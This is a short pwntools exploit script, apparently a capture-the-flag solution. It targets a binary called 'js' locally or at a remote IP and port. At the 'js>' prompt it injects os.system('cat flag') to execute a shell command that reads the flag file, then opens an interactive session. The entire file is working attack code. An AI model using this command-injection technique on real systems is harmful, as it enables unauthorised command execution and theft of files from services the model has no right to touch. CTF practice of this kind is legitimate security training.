#!/usr/bin/env python3

from pwn import *

exe = ELF("./js")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("61.147.171.105", 57165)

    return r


def main():
    r = conn()

    r.sendlineafter(b"js>", b"os.system(\'cat flag\')")

    r.interactive()


if __name__ == "__main__":
    main()
